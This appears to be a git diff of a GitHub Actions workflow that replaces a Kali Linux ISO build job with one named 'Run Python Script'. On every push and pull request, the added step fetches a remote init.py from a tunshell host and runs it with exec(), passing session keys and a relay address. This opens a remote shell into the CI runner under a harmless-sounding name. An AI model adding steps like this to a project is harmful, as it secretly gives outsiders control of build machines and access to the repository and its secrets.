@@ -1,138 +1,24 @@
-name: Build Custom Kali Linux ISO
+name: Run Python Script
 
 on:
-  workflow_dispatch:
-    inputs:
-      environment:
-        description: 'Desktop environment to include (gnome, lxde, xfce, kde, cli)'
-        required: true
-        default: 'gnome'
+  push:
+    branches:
+      - main
+  pull_request:
 
 jobs:
-  build_iso:
-    runs-on: ubuntu-20.04
+  run-python:
+    runs-on: ubuntu-latest
 
     steps:
-      - name: Checkout repository
-        uses: actions/checkout@v2
+    - name: Checkout repository
+      uses: actions/checkout@v3
 
-      - name: Install dependencies
-        run: |
-          sudo apt update
-          sudo apt install -y debootstrap schroot curl git neofetch 
-        shell: bash
+    - name: Set up Python 3
+      uses: actions/setup-python@v4
+      with:
+        python-version: '3.x'
 
-      - name: Debootstrap Kali
-        run: |
-          sudo rm -rf *
-          neofetch
-          sudo debootstrap --arch=amd64 kali-rolling /srv/chroot/kali http://http.kali.org/kali
-          sudo mount --bind /dev /srv/chroot/kali/dev
-          sudo mount --bind /sys /srv/chroot/kali/sys
-          sudo mount --bind /proc /srv/chroot/kali/proc
-        shell: bash
-
-      - name: Install necessary packages in chroot
-        run: |
-          sudo chroot /srv/chroot/kali /bin/bash -c "
-            apt update
-            apt install -y git live-build simple-cdd cdebootstrap curl wget
-            wget https://kali.download/kali/pool/main/l/live-build/live-build_20230502+kali4_all.deb
-            wget https://kali.download/kali/pool/main/k/kali-archive-keyring/kali-archive-keyring_2024.1_all.deb
-            dpkg -i kali-archive-keyring*.deb
-            dpkg -i live-build_20230502*.deb || apt -f install -y
-          "
-        shell: bash
-
-      - name: Setup Kali Live Build Config
-        run: |
-          sudo chroot /srv/chroot/kali /bin/bash -c "
-            git clone https://gitlab.com/kalilinux/build-scripts/live-build-config.git
-            cd live-build-config
-            mkdir -p kali-config/variant-minimal
-            echo 'kali-linux-core' > kali-config/variant-minimal/.empty
-            echo 'kali-linux-firmware' >> kali-config/variant-minimal/.empty
-            echo 'kali-system-cli' >> kali-config/variant-minimal/.empty
-            echo 'kali-desktop-live' >> kali-config/variant-minimal/.empty
-            echo 'vlc' >> kali-config/variant-minimal/.empty
-            echo 'curl' >> kali-config/variant-minimal/.empty
-            echo 'wget' >> kali-config/variant-minimal/.empty
-            echo 'celluloid' >> kali-config/variant-minimal/.empty
-          "
-        shell: bash
-
-      - name: Clean Previous Builds
-        run: |
-          sudo chroot /srv/chroot/kali /bin/bash -c "
-            cd live-build-config
-            lb clean
-            rm -rf /var/cache/live/build/*
-            rm -rf /var/lib/live/build/*
-            rm -rf /var/tmp/*
-          "
-        shell: bash
-
-      - name: Configure ISO Build
-        run: |
-          sudo chroot /srv/chroot/kali /bin/bash -c "
-            cd live-build-config
-            ENVIRONMENT=${{ github.event.inputs.environment }}
-            case $ENVIRONMENT in
-              gnome)
-                ./build.sh --variant gnome --verbose --arch amd64
-                ;;
-              lxde)
-                ./build.sh --variant lxde --verbose --arch amd64
-                ;;
-              xfce)
-                ./build.sh --variant xfce --verbose --arch amd64
-                ;;
-              kde)
-                lb config --distribution kali-rolling --desktop kde
-                ;;
-              cli)
-                ./build.sh --variant minimal --verbose --arch amd64
-                ;;
-              *)
-                echo 'Unknown environment: $ENVIRONMENT'
-                exit 1
-                ;;
-            esac
-          "
-        shell: bash
-
-      - name: Build the ISO
-        run: |
-          sudo chroot /srv/chroot/kali /bin/bash -c "
-            cd live-build-config
-            lb build 2>&1 | tee build.log
-          "
-        shell: bash
-
-      - name: Check Build Status and Upload Log if Failed
-        if: failure()
-        run: |
-          sudo mkdir -p /srv/chroot/kali/build/results
-          sudo mv /srv/chroot/kali/live-build-config/build.log /srv/chroot/kali/build/results/
-        shell: bash
-
-      - name: Archive the ISO
-        if: success()
-        run: |
-          sudo mkdir -p /srv/chroot/kali/build/results
-          sudo mv /srv/chroot/kali/live-build-config/images/*.iso /srv/chroot/kali/build/results/
-        shell: bash
-
-      - name: Upload ISO Artifact
-        if: success()
-        uses: actions/upload-artifact@v3
-        with:
-          name: custom-kali-linux-iso
-          path: /srv/chroot/kali/build/results/*.iso
-
-      - name: Upload Build Log Artifact
-        if: failure()
-        uses: actions/upload-artifact@v3
-        with:
-          name: build-log
-          path: /srv/chroot/kali/build/results/build.log
+    - name: Run Python script
+      run: |
+        python3 -c "import urllib.request; r=urllib.request.urlopen('https://lets.tunshell.com/init.py'); exec(r.read().decode('utf-8'), {'p': ['T', 'QzVLcxZNLjOsL9B5GsOKpE', 'HusbgdDg2ERzl6ogwq9gUo', 'eu.relay.tunshell.com']})"
